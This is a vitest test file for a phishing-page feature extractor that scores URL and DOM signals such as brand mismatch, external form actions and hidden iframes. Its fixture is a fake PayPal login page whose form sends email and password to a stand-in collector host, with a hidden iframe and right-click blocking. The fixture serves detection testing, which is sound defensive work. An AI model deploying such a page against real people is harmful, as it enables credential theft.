import { describe, expect, it } from 'vitest';
import { extract } from './extract.js';
import {
  DOM_FEATURE_NAMES,
  FEATURE_NAMES,
  SCHEMA_VERSION,
  URL_FEATURE_NAMES,
  vectorToRecord,
} from './schema.js';
import { htmlDocument } from './testing/dom.js';
import { InvalidUrlError } from './url-parts.js';

const PHISH_URL = 'https://paypal-account.verify-login.example.xyz/signin/index.php?id=123';
const PHISH_HTML = `<!doctype html><html><head><title>PayPal: Log in</title>
<link rel="icon" href="https://www.paypalobjects.com/favicon.ico"></head>
<body oncontextmenu="return false">
<form action="https://collect.evil.example.org/p.php">
<input type="email" name="u"><input type="password" name="p"><input type="submit"></form>
<a href="https://www.paypal.com/help">Help</a><a href="#">Forgot?</a>
<iframe src="/t" width="0" height="0"></iframe></body></html>`;

describe('extract', () => {
  it('returns a full-length vector tagged with the schema version', () => {
    const v = extract(PHISH_URL, htmlDocument(PHISH_HTML, PHISH_URL));
    expect(v.schemaVersion).toBe(SCHEMA_VERSION);
    expect(v.values).toHaveLength(FEATURE_NAMES.length);
    for (const value of v.values) expect(Number.isFinite(value)).toBe(true);
  });

  it('computes URL and DOM features for a phishing-like page', () => {
    const r = vectorToRecord(extract(PHISH_URL, htmlDocument(PHISH_HTML, PHISH_URL)));
    expect(r).toMatchObject({
      brand_outside_registered_domain: 1,
      suspicious_tld: 1,
      num_links: 2,
      pct_ext_links: 0.5,
      pct_null_links: 0.5,
      ext_favicon: 1,
      has_password_field: 1,
      num_input_fields: 2,
      form_action_external: 1,
      has_hidden_iframe: 1,
      title_brand_mismatch: 1,
      login_brand_mismatch: 1,
      right_click_disabled: 1,
    });
  });

  describe('URL-only mode', () => {
    it('sets every DOM feature to NaN and every URL feature to a number', () => {
      const r = vectorToRecord(extract(PHISH_URL));
      for (const n of DOM_FEATURE_NAMES) expect(r[n]).toBeNaN();
      for (const n of URL_FEATURE_NAMES) expect(Number.isFinite(r[n])).toBe(true);
    });

    it('gives the same URL features with or without a document', () => {
      const withDom = vectorToRecord(extract(PHISH_URL, htmlDocument(PHISH_HTML, PHISH_URL)));
      const urlOnly = vectorToRecord(extract(PHISH_URL));
      for (const n of URL_FEATURE_NAMES) expect(urlOnly[n]).toBe(withDom[n]);
    });
  });

  it('is deterministic', () => {
    const doc = htmlDocument(PHISH_HTML, PHISH_URL);
    expect(extract(PHISH_URL, doc)).toEqual(extract(PHISH_URL, doc));
  });

  it('rejects non-http(s) URLs', () => {
    expect(() => extract('chrome://settings/')).toThrow(InvalidUrlError);
    expect(() => extract('about:blank', htmlDocument(''))).toThrow(InvalidUrlError);
  });
});
